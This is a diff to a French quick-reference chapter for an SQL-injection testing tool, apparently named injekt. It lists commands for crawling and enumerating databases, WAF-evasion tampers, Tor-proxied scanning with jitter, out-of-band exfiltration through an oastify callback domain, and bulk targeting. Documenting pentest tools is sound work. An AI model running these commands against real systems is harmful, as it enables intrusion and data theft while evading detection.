@@ -3,7 +3,7 @@
 ## 9.1 Arbre de décision (60 secondes)
 
 ```
-Cible unique paramétrée ?
+Cible unique paramétrée ? (`injekt --target` ou `auto --target` ; `scan --target` = alias déprécié)
 ├─ Oui → --profile quick (-p id) → finding ? → oui : fingerprint forcé + union/extract (chap.5)
 │                                  └─ non : balanced → WAF ? → chap.4 : matchers/level (chap.3.5)
 ├─ Host / domaine ? → recon crawl (50 pages) → import --test → recon scan stealth
@@ -20,12 +20,13 @@ Cible unique paramétrée ?
 injekt --no-banner info
 injekt --target "https://example.com/?id=1" --profile stealth --dry-run
 
-# Recon :
+# Recon (`recon scan` = alias → préférer `auto --with-recon`) :
 injekt recon crawl --target "example.com" --depth 2 --max-pages 100
 injekt recon scan --target "example.com" --auto-enumerate --dbs
+injekt auto --target "example.com" --with-recon --auto-enumerate --dbs
 injekt recon import --file discovered.json --test --enumerate
 
-# Scan :
+# Scan (voie recommandée : cible globale ; `scan --target` = alias historique déprécié) :
 injekt --target "https://example.com/?id=1" --profile quick
 injekt --target "https://example.com/?id=1" --techniques boolean,error --dbms mysql
 injekt --target "https://example.com/?id=1" --techniques time --dbms postgres
@@ -43,6 +44,15 @@ injekt --target "https://example.com/?id=1" --prefix "')" --suffix "-- -" --safe
 injekt --target "https://example.com/?id=1" --text-only --not-string "captcha" --ignore-code 429,503 --code 200
 injekt --target "https://example.com/?id=1" --level 2 --fetch-using boolean
 
+# Budgets & confirmation (opt-in, jamais profil/config) :
+injekt --target "https://example.com/?id=1" --max-duration 120 --request-budget 500
+injekt --target "https://example.com/?id=1" --confirm
+injekt --target "https://example.com/?id=1" --confirm --no-mutation
+
+# Second-order (lab, même-origine) + verdict offline (0 requête) :
+injekt --target "https://example.com/?id=1" --second-order --second-order-revisit-url /admin
+injekt --target "https://example.com/?id=1" --explain id@query
+
 # OPSEC :
 injekt --target "https://example.com/?id=1" --proxy socks5h://127.0.0.1:9050 --jitter "750,250" --rate-limit 5
 injekt --target "http://192.168.1.10/?id=1" --allow-private   # lab uniquement
@@ -59,6 +69,7 @@ injekt --target "https://example.com/?id=1" --oob-domain x.oastify.com \
   --oob-poll-url "https://x.oastify.com/poll/{token}" --techniques oob --oob-wait-secs 10
 
 # Pipeline & masse :
+injekt auto --target "https://example.com/?id=1" --dry-run
 injekt auto --target "https://example.com/?id=1" --output report.json
 injekt auto --target example.com --with-recon --auto-enumerate
 injekt --bulk-file targets.txt --output bulk-report.json --threads 3
@@ -67,8 +78,16 @@ injekt --openapi-file openapi.json --dry-run && injekt --openapi-file openapi.js
 
 # Persistance / rapports :
 injekt --target "https://example.com/?id=1" --output report.json
+injekt --target "https://example.com/?id=1" --output report.sarif --format sarif
+injekt --target "https://example.com/?id=1" --output report.xml --format junit
+injekt --target "https://example.com/?id=1" --output report.md --format md
 injekt --target "https://example.com/?id=1" --export-encrypted ./session.enc
 INJEKT_PASSPHRASE='...' injekt replay --file ./session.enc
+
+# Scaffold / aide :
+injekt init --preset stealth --path ./injekt.toml
+injekt completions bash >> ~/.bash_completion
+injekt man | man -l -
 ```
 
 ## 9.3 Références rapides
@@ -84,7 +103,7 @@ unicodeencode overlongutf8 space2paren versionedfuzz jsonunicodeescape
 numericobfuscate linecomment base64encode(opt-in)`
 (+ presets `cloudflare-generic`/`aggressive`).
 
-**DBMS** : `mysql postgres mssql oracle` (+ alias `mariadb/pg/sqlserver/ora`).
+**DBMS** : `mysql postgres mssql oracle sqlite` (+ alias `mariadb/pg/sqlserver/ora`).
 
 **Exit** : `0` OK (même sans finding) · `1` runtime · `2` usage.
 **Limites** : bulk 1000 · depth 16 · pages 100 000 · `max-per-template` 3 ·
